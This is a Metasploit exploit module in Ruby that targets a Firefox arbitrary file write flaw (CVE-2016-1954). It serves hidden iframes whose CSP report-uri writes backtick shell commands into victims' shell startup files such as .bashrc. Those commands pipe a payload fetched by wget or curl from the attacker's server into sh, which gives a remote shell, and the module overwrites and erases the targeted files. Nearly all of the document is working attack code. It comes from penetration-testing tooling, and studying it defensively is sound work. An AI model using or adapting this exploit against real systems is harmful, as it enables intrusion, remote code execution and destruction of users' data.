##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  # You have to guess a logged-in user's name.
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Firefox report-uri File Overwrite',
      'Description' => %q{
        This module abuses an arbitrary file write vulnerability in Firefox < 45.0
        to plant a .login (or similar) file on the victim, ultimately resulting in
        a shell. The exploit causes a file to be written to the path of your choice
        containing backticks ` that allow us to execute shell commands. A curl or
        wget binary on the system is then used to stage a metasploit payload.

        For this module to work, you must know or guess (up to a few hundred tries)
        the username of the logged in user. As a warning, this module is fairly
        destructive and will attempt to overwrite any paths specified in FILES
        and eventually erase them. Use with caution.
      },
      'Author'         => [
        'Nicolas Golubovic', # vuln discoverer
        'evo'
      ],
      'License'     => MSF_LICENSE,
      'Arch'           => [ARCH_CMD],
      'Targets'        => [ ['Automatic', {}] ],
      'Platform'      => %w{ linux osx solaris unix },
      'DefaultTarget'  => 0,
      'DefaultOptions' => { 'PrependFork' => true },
      'SessionTypes'   => ['shell', 'meterpreter'],
      'DisclosureDate' => 'Mar 8 2016',
      'References' => [
        ['URL', 'https://www.mozilla.org/en-US/security/advisories/mfsa2016-17/'],
        ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=1243178'],
        ['CVE', '2016-1954']
      ]
    ))

    register_options([
      OptString.new('FILES', [
        true,
        'Comma-separated list of file paths to drop the shell script to.',
        %Q(
          /home/ubuntu/.bashrc,
          /home/user/.bashrc,
          /var/root/.bashrc,
          /root/.bashrc
        )
      ]),
      OptString.new('URIPATH', [
        true,
        'Path to the exploit. This needs to be "/" for space purposes.',
        '/'
      ])
    ])

    register_advanced_options([
      OptBool.new('UseCurl', [
        false,
        'Use curl instead of wget to stage the payload.',
        false
      ]),
      OptString.new('TmpDir', [
        false,
        'A writable temporary dir for storing the staged payload.',
        '/tmp'
      ])
    ])
  end

  def on_request_uri(cli, request)
    if request.headers['User-Agent'] =~ /(curl|wget)/i
      print_good("Shell script request detected. Serving payload stager.")
      send_response(cli, payload.raw, 'Content-Type' => 'text/plain')
    else
      if request.qstring['file']
        path = request.qstring['file']
        print_status("Client loaded exploit for path #{path}.")
        send_response(cli, per_file_html, {
          'Content-Security-Policy' => csp_exploit(path),
          'Content-Type' => 'text/html'
        })
      else
        print_status("Client loaded main page.")
        send_response_html(cli, main_html)
      end
    end
  end

  # Here is actual vulnerability; CSP violations reported to file:/// URLs
  # get written to disk. In Firefox, CSP violation report looks like:
  #
  # {"csp-report": {
  #   "document-uri": "http://192.168.1.1:8080/",
  #   "blocked-uri": "self",
  #   "violated-directive": "script-src http://192.168.1.1:8080",
  #   "script-sample": "`wget -q0- 192.168.1.1:8080|sh`"
  # }}
  #
  # The "script-sample" field seems to be the only place that allows injection of
  # shell metacharacters like backticks without URI encoding.
  def csp_exploit(path)
    "script-src 'self'; report-uri file://#{path}"
  end

  def files
    datastore['FILES'].split(/\s*,\s*|\s+/)
  end

  def main_html
    css = 'style="width:0;height:0;border:0"'
    frames = files.map { |f| "<iframe #{css} src='/?file=#{Rex::Text.uri_encode(f)}'></iframe>" }
    "<body>#{frames.join}</body>"
  end

  def per_file_html
    # This gets stuffed in the written JSON blob without URL encoding.
    cmd = datastore['UseCurl'] ? 'curl' : 'wget -qO-'
    "<body><script>`#{cmd} #{datastore['SRVHOST']}:#{datastore['SRVPORT']}|sh &`</script></body>"
  end

end
